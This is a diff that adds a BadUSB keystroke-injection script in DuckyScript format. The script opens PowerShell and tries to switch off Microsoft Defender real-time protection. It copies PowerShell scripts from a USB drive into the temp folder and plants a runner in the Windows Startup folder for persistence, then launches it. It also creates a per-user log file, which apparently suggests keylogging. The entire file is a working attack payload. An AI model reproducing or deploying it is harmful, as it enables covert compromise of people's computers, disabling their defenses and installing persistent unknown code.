@@ -1,0 +1,25 @@
+REM Stage 1
+REM open runbox
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 300
+
+REM stage 2
+REM attempt to disable ms defender
+STRING set-mppreference -disablerealtimemonitoring $true
+ENTER
+
+REM stage 3
+REM place the files to their destination
+REM replace 'X' with your drive's label name
+STRING $u=gwmi win32_volume|?{$_.LabelName -eq 'L'};cd $u.name;cp ./x.ps1 $env:temp;cp ./l.ps1 $env:temp;cp ./runner.cmd "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\";cd $env:temp;echo "">"$env:username.log";
+ENTER
+DELAY 200
+
+REM stage 4
+STRING cd "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\";.\runner.cmd;exit;
+ENTER
+DELAY 200
+
